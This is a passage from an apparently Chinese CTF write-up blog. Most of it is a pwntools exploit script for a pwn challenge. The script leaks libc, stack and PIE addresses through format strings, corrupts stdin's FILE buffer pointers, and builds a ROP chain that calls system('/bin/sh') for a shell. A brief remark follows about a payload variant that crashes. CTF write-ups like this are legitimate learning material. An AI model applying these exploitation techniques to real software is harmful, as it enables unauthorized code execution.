>>"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input size:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">echo2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input size:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">get_base</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"say:"</span><span class="token punctuation">)</span>    info<span class="token operator">=</span>int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0xe</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    base<span class="token operator">=</span>info<span class="token operator">-</span>addr    <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span><span class="token number">0x4527a</span><span class="token punctuation">,</span><span class="token number">0xf0364</span><span class="token punctuation">,</span><span class="token number">0xf1207</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#leak</span>echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%&amp;#123;&amp;#125;$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>get_base<span class="token punctuation">(</span><span class="token number">0x20840</span><span class="token punctuation">)</span>echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%&amp;#123;&amp;#125;$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr<span class="token operator">=</span>get_base<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#栈地址到加载地址的偏移会变</span>echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%&amp;#123;&amp;#125;$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x9</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pie_base<span class="token operator">=</span>get_base<span class="token punctuation">(</span><span class="token number">0x1107</span><span class="token punctuation">)</span>io_buffer_base<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdin_"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">7</span>login<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>io_buffer_base<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"io_buffer_base:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>io_buffer_base<span class="token punctuation">)</span><span class="token punctuation">)</span>echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%&amp;#123;&amp;#125;$hhn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xa</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdin_"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">131</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>echo2<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    echo2<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># debug([0x00000000000106D,0x0000000000000F77])</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>pie_base<span class="token operator">+</span><span class="token number">0x00000000000011b3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>echo2<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># echo2("\n")</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h3><p>实际上这样构造payload的时候(多了个\n),实际上没有\n   scanf函数是能截断的</p><pre class=" language-python"><code class="language-python">payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdin_"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">131</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span></code></pre><p>上面的payload会设置一些指针然后会造成崩溃.</p><h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ctf,wp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
